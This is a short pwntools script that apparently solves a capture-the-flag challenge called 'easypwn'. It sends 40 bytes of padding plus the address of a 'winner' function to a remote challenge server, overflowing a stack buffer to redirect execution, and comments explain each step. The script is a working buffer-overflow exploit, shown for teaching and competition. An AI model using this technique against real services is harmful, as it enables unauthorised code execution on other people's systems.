from pwn import *

exe = context.binary = ELF("./easypwn", checksec=False)
io = remote("io.ept.gg", 30004)
io.clean()                     # Skip the stuff printed in the terminal before our input

payload = b"A" * 40            # Padding to the return address on the stack
payload += p64(exe.sym.winner) # Convert the address we want to call into bytes

io.sendline(payload)
io.interactive()